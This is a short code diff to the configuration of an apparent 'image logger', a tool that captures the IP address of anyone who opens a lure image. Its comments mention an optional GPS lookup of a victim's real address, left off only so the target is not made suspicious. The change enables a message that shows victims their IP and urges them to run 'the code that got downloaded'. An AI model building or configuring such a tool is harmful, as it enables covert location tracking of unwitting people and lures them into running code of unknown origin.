@@ -27,7 +27,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "Your IP is {ip}, if you want to make your own image logger run the code that got downloaded.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
